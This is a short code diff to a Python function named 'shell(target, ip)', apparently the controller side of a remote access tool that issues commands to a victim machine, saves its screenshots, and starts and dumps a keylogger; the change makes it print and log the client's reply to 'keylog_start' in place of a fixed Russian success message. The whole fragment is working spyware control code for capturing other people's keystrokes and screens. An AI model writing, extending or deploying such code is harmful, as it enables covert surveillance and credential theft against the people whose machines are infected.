@@ -120,8 +120,9 @@ def shell(target, ip):
                 save_screenshot(target, screenshot_id)
                 screenshot_id += 1
             elif command.startswith("keylog_start"):
-                reliable_recv(target)
-                logging.info("[+] Кейлоггер успешно запущен на клиенте.")
+                response = reliable_recv(target)
+                print(response)
+                logging.info(response)
             elif command.startswith("keylog_dump"):
                 logs = reliable_recv(target)
                 save_keylogs(logs)
